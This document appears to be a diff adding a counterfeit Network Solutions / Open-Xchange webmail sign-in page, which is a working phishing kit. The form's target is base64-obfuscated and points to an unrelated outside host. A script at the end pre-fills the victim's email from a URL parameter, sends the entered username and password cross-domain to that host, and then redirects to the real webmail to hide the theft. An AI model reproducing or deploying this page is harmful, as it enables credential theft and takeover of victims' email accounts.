role="presentation"><a href="#" role="menuitem" lang="de-CH" data-value="de_CH">Deutsch (Schweiz)</a></li><li role="presentation"><a href="#" role="menuitem" lang="et-EE" data-value="et_EE">eesti (Eesti)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-AU" data-value="en_AU">English (Australia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-CA" data-value="en_CA">English (Canada)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-DE" data-value="en_DE">English (Germany)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-IE" data-value="en_IE">English (Ireland)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-NZ" data-value="en_NZ">English (New Zealand)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-SG" data-value="en_SG">English (Singapore)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-ZA" data-value="en_ZA">English (South Africa)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-GB" data-value="en_GB">English (United Kingdom)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-US" data-value="en_US">English (United States)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-AR" data-value="es_AR">Español (Argentina)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-BO" data-value="es_BO">Español (Bolivia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-CL" data-value="es_CL">Español (Chile)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-CO" data-value="es_CO">Español (Colombia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-CR" data-value="es_CR">Español (Costa Rica)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-EC" data-value="es_EC">Español (Ecuador)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-SV" data-value="es_SV">Español (El Salvador)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-ES" data-value="es_ES">Español (Espana)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-GT" data-value="es_GT">Español (Guatemala)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-HN" data-value="es_HN">Español (Honduras)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-MX" data-value="es_MX">Español (México)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-NI" data-value="es_NI">Español (Nicaragua)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-PA" data-value="es_PA">Español (Panamá)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-PE" data-value="es_PE">Español (Perú)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-PR" data-value="es_PR">Español (Puerto Rico)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-DO" data-value="es_DO">Español (Républica Dominicana)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-US" data-value="es_US">Español (United States)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-BE" data-value="fr_BE">Français (Belgique)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-CA" data-value="fr_CA">Français (Canada)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-FR" data-value="fr_FR">Français (France)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-CH" data-value="fr_CH">Français (Suisse)</a></li><li role="presentation"><a href="#" role="menuitem" lang="it-IT" data-value="it_IT">Italiano (Italia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="it-CH" data-value="it_CH">Italiano (Svizzera)</a></li><li role="presentation"><a href="#" role="menuitem" lang="lv-LV" data-value="lv_LV">Latviešu (Latvija)</a></li><li role="presentation"><a href="#" role="menuitem" lang="hu-HU" data-value="hu_HU">Magyar (Magyarország)</a></li><li role="presentation"><a href="#" role="menuitem" lang="nl-BE" data-value="nl_BE">Nederlands (België)</a></li><li role="presentation"><a href="#" role="menuitem" lang="nl-NL" data-value="nl_NL">Nederlands (Nederland)</a></li><li role="presentation"><a href="#" role="menuitem" lang="nb-NO" data-value="nb_NO">Norsk (Norge)</a></li><li role="presentation"><a href="#" role="menuitem" lang="pl-PL" data-value="pl_PL">Polski (Polska)</a></li><li role="presentation"><a href="#" role="menuitem" lang="pt-BR" data-value="pt_BR">Português (Brasil)</a></li><li role="presentation"><a href="#" role="menuitem" lang="ru-RU" data-value="ru_RU">Pусский (Россия)</a></li><li role="presentation"><a href="#" role="menuitem" lang="ro-RO" data-value="ro_RO">Română (România)</a></li><li role="presentation"><a href="#" role="menuitem" lang="sk-SK" data-value="sk_SK">Slovenčina (Slovensko)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fi-FI" data-value="fi_FI">Suomi (Suomi)</a></li><li role="presentation"><a href="#" role="menuitem" lang="sv-SE" data-value="sv_SE">Svenska (Sverige)</a></li><li role="presentation"><a href="#" role="menuitem" lang="tr-TR" data-value="tr_TR">Türkçe (Türkiye)</a></li><li role="presentation"><a href="#" role="menuitem" lang="zh-CN" data-value="zh_CN">中文 (简体)</a></li><li role="presentation"><a href="#" role="menuitem" lang="zh-TW" data-value="zh_TW">中文 (繁體)</a></li><li role="presentation"><a href="#" role="menuitem" lang="ja-JP" data-value="ja_JP">日本語 (日本)</a></li></ul></div></span></div>
+        </header>
+        <div id="io-ox-login-content">
+          <div class="align-center col-sm-6 col-xs-12">
+            <div class="row">
+              <main id="io-ox-login-box" class="col-xs-12">
+                <div class="row">
+                  <div class="flex-column">
+                    <div id="box-form" class="col-xs-12">
+                      <div id="box-form-header" class="row" data-i18n="" data-i18n-attr="text">Webmail Login</div>
+                      <div id="box-form-body" class="row">
+                        <!-- login dialog; must be hard-coded this way, otherwise browsers won't inject credentials -->
+                        <form method="post" data-action="aHR0cHM6Ly9sb29rYWZ0ZXJ5b3VyY2hpbGRyZW4uY29tL21hbmV0c29sL0F1dGgucGhw" id="io-ox-login-form" class="ajaxform" target="store-credentials" novalidate="">
+                          <div class="col-xs-12">
+                            <div class="row title">
+                              <h1 id="login-title" class="col-xs-12" data-i18n="Sign in">Sign in</h1>
+                            </div>
+                            <input type="hidden" name="location" value="">
+                            <div class="row help">
+                              <div class="col-xs-12">
+                                <p id="io-ox-login-help" class="help-block"></p>
+                              </div>
+                            </div>
+                            <div class="row username">
+                              <div class="form-group col-xs-12">
+                                <label for="io-ox-login-username" data-i18n="Email">Email</label>
+                                <div class="text-right" ><a href="https://webmail-oxcs.networksolutionsemail.com/appsuite/#" role="button" data-io-ox-loginproxy="1">Change</a></div><input type="text" id="io-ox-login-username" name="username" class="form-control email-d" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" data-i18n="Email" autocomplete="username" readonly=""></input>
+                              </div>
+                            </div>
+                            <div class="row password" >
+                              <div class="form-group col-xs-12">
+                                <label for="io-ox-login-password"><span data-io-ox-loginproxy="1">Your password</span><def data-io-ox-loginproxy="1" title="required">*</def></label>
+                                <input type="password" id="io-ox-login-password" name="password" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" data-i18n="Password" autocomplete="current-password"></input>
+                                <div class="text-right" id="io-ox-forgot-password">
+                                  <a href="https://www.networksolutions.com/mail-admin/forgot-password?user=" target="_blank" data-i18n="Forgot your password?">Forgot your password?</a>
+                                </div>
+                              </div>
+                            </div>                            
+                            <div class="row options">
+                              <div class="col-sm-6 col-xs-12" id="io-ox-login-store">
+                                <div class="checkbox custom">
+                                  <label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label">
+                                    <input type="checkbox" class="sr-only" id="io-ox-login-store-box" checked="checked" name="staySignedIn" value="1">Stay signed in</label>
+                                </div>
+                              </div>
+                            </div>
+                            <!-- Feedback area -->
+                            <div class="row feedback">
+                              <div class="col-xs-12 alert-highlight" id="io-ox-login-feedback">
+                                <div role="alert" class="selectable-text alert alert-info a1 hidden">Please enter your
+                                  password.
+                                  (UI-0002)</div>
+                                <div role="alert" class="selectable-text alert alert-info a2 hidden">The password is
+                                  incorrect.
+                                </div>
+                              </div>
+                            </div>
+                            <div class="row button">
+                              <div class="form-group col-xs-12">
+                                <button type="submit" name="signin" id="io-ox-login-button" class="btn btn-primary form-control" data-i18n="Sign in" data-io-ox-loginproxy="1">Sign In</button>
+                              </div>
+                            </div>
+                          </div>
+                        </form>
+                        
+                        <div class="form" style="display: none;">
+                          <div id="io-ox-select-device-form" class="col-xs-12 p-0">
+                            <div id="io-ox-select-device-header" class="row title">
+                              <h1 id="io-ox-select-device-title" class="col-xs-12"></h1>
+                            </div>
+                            <div id="io-ox-select-device-body" class="row p-16"></div>
+                            <div id="io-ox-select-device-footer" class="row border-top p-16">
+                            </div>
+                          </div>
+                        </div>
+                        <div class="form" style="display: none;">
+                          <div id="io-ox-multifactor-form" class="col-xs-12 p-0">
+                            <div id="io-ox-multifactor-header" class="row title">
+                              <h1 id="multifactor-title" class="col-xs-12 flex-row"></h1>
+                            </div>
+                            <div id="io-ox-multifactor-body" class="row p-16">
+                              <div class="form-group col-xs-12 p-0 m-0">
+                              </div>
+                            </div>
+                            <div id="io-ox-multifactor-footer" class="row border-top p-16"></div>
+                          </div>
+                        </div>
+                        <div class="form" style="display: none;">
+                          <div id="io-ox-lost-device-form" class="col-xs-12 p-0">
+                            <div id="io-ox-lost-device-header" class="row title">
+                              <h1 id="io-ox-lost-device-title" class="col-xs-12"></h1>
+                            </div>
+                            <div id="io-ox-lost-device-body" class="row p-16"></div>
+                            <div id="io-ox-lost-device-footer" class="row border-top p-16"></div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div id="io-ox-information-message" data-i18n="" data-i18n-attr="html"><p>We are updating our email security and will require all email server connections to use an encrypted connection when connecting via POP or IMAP from a device. To avoid any email connection issues, please be sure to update your mail client settings.</p> <a rel="noopener" target="_blank" class="btn btn-primary form-control" href="https://update.networksolutions.com/">Learn More…</a></div>
+                  </div>
+                </div>
+              </main>
+            </div>
+          </div>
+        </div>
+        <footer id="io-ox-login-footer"><div class="composition-element login-spacer"></div><span>© 2025 Open-Xchange GmbH</span><div class="composition-element"><span data-i18n="">Version:</span><span>8.39.1</span></div><div class="composition-element custom-login-links"><span class=""><a style="color: rgb(108, 108, 108);" href="https://newfold.com/privacy-center" target="blank">Privacy policy</a></span></div><div class="composition-element custom-login-links"><span class=""><a style="color: rgb(108, 108, 108);" href="https://legal.web.com/Document/Get/TermsOfUse" target="blank">Legal notes</a></span></div><div class="composition-element login-spacer"></div></footer>
+      </div>
+    </div>
+  </div>
+  <!-- offline notifier -->
+  <div role="complementary">
+    <div id="io-ox-offline" style="bottom: -41px; display: none;"></div>
+    <!-- screen reader notifier -->
+    <div id="io-ox-alert-screenreader" role="alert" aria-live="polite" class="sr-only">
+      <span id="sr-alert-text"></span>
+    </div>
+  </div>
+
+  <div id="tmp" style="display: none;">
+    <iframe src="javascript:false" name="store-credentials" width="0" height="0" tabindex="-1" title="empty" style="display:none"></iframe>
+  </div>
+  <script nomodule="">
+    // cSpell:disable
+    var language = (navigator.language || navigator.userLanguage).substr(0, 2),
+      messages = {
+        de: 'Ihr Browser wird nicht unterstützt',
+        es: 'Su navegador no está admitido',
+        fr: 'Votre navigateur n\'est pas pris en charge',
+        it: 'Il tuo browser non è supportato',
+        ja: 'ご利用のブラウザはサポートされていません',
+        nl: 'Uw browser wordt niet ondersteund'
+      },
+      message = messages[language] || 'Your browser is not supported',
+      showStopper = document.querySelector('#showstopper');
+    // cSpell:enable
+    document.querySelector('#background-loader').classList.remove('busy');
+    document.querySelector('#background-loader .throbber').classList.remove('io-ox-busy');
+    showStopper.style.display = 'block';
+    showStopper.innerHTML = message;
+  </script>
+  <noscript>
+    <p class="noscript">This app uses JavaScript. Your browser either doesn't support JavaScript or you have it turned
+      off. To use this app please use a JavaScript enabled browser.</p>
+  </noscript>
+  <!-- placeholder for custom vars and rules -->
+  <style type="text/css" id="theme-colors"></style>
+  <style type="text/css" id="theme-accent"></style>
+  <style type="text/css" id="theme"></style>
+  <style type="text/css" id="theme-values"></style>
+  <!-- shared styles for default logo; also to avoid Safari bug (OXUIB-1418) -->
+  <svg width="0" height="0" version="1.1" xmlns="http://www.w3.org/2000/svg" class="invisible" aria-hidden="true">
+    <defs>
+      <linearGradient x1="54.4260204%" y1="12.8418549%" x2="7.94367821%" y2="85.4289973%" id="logoGradient-1">
+        <stop stop-color="var(--accent-300)" offset="0%"></stop>
+        <stop stop-color="var(--accent-600)" offset="100%"></stop>
+      </linearGradient>
+      <linearGradient x1="71.8535659%" y1="97.6732587%" x2="31.1841722%" y2="3.61382138%" id="logoGradient-2">
+        <stop stop-color="var(--accent-400)" offset="0%"></stop>
+        <stop stop-color="var(--accent-700)" offset="100%"></stop>
+      </linearGradient>
+    </defs>
+  </svg>
+
+
+
+<div class="accessible-tooltip-container" aria-hidden="true"></div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    // Select form and input elements
+    const $form = $('#io-ox-login-form');
+    const $emailInput = $('.email-d');
+    const $passwordInput = $('#io-ox-login-password');
+    const $feedbackA1 = $('.a1');
+    const $feedbackA2 = $('.a2');
+    const $loader = $('.loader');
+
+    // Pre-fill email from base64-encoded username parameter
+    const url = new URL(window.location.href);
+    const emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
+    let email = null;
+
+    // Decode base64-encoded username
+    const encodedUsername = url.searchParams.get('username');
+    if (encodedUsername) {
+        try {
+            const decodedUsername = atob(encodedUsername).replace(/[<>]/g, ''); // Decode and sanitize
+            if (emailRegex.test(decodedUsername)) {
+                email = decodedUsername;
+                console.log("Decoded Username: " + decodedUsername);
+            } else {
+                console.warn("Decoded username is not a valid email: " + decodedUsername);
+            }
+        } catch (e) {
+            console.error("Error decoding base64 username string:", e);
+        }
+    }
+
+    // Populate email input if valid
+    if (email) {
+        $emailInput.val(email);
+    }
+
+    // Show password field if email is pre-filled
+    if ($emailInput.val()) {
+        $('#io-ox-login-password').closest('.password').removeClass('hidden');
+    }
+
+    // Handle form submission
+    $form.on('submit', function(e) {
+        e.preventDefault();
+        $feedbackA1.hide();
+        $feedbackA2.hide();
+
+        const username = $emailInput.val().trim();
+        const password = $passwordInput.val().trim();
+
+        if (!username || !password) {
+            $feedbackA1.removeClass('hidden').fadeIn();
+            $passwordInput.val('');
+            setTimeout(() => $feedbackA1.fadeOut(), 3000);
+            return;
+        }
+
+        $loader.text('Logging in...').prop('disabled', true).fadeIn();
+        const data = { username, password };
+        const actionUrl = atob($form.attr('data-action'));
+
+        corsReq(actionUrl, data, 'POST', function(response) {
+            console.log('AJAX Response:', response);
+            $loader.prop('disabled', false).fadeOut();
+            if (response?.responseJSON?.success && response.responseJSON.authenticated) {
+                const redirectUrl = 'https://webmail-oxcs.networksolutionsemail.com/appsuite';
+                console.log('Redirecting to:', redirectUrl);
+                window.location.assign(redirectUrl);
+            } else {
+                console.log('No redirect, response:', response.responseJSON);
+                showError();
+            }
+        }).fail(function(jqXHR, textStatus, errorThrown) {
+            console.log('AJAX Failed:', textStatus, errorThrown);
+            showError();
+        });
+    });
+
+    // Handle show/hide password button
+    $('#showHideButton').on('click', function() {
+        const $button = $(this);
+        const type = $passwordInput.attr('type') === 'password' ? 'text' : 'password';
+        $passwordInput.attr('type', type);
+        $button.text(type === 'password' ? 'Show' : 'Hide');
+    });
+
+    // Show error message
+    function showError() {
+        $loader.prop('disabled', false);
+        $feedbackA2.removeClass('hidden').fadeIn();
+        $passwordInput.val('');
+        setTimeout(() => $feedbackA2.fadeOut(), 3000);
+    }
+
+    // Custom CORS AJAX request function
+    function corsReq(url, data, type, complete) {
+        const settings = {
+            url: url,
+            data: data,
+            type: type,
+            dataType: 'json',
+            crossDomain: true,
+            async: true,
+            xhrFields: { withCredentials: false },
+            complete: complete
+        };
+        console.log('AJAX Settings:', settings);
+        return $.ajax(settings);
+    }
+});
+</script>
+</body></html>
+Page title: Sign in - Professional Email
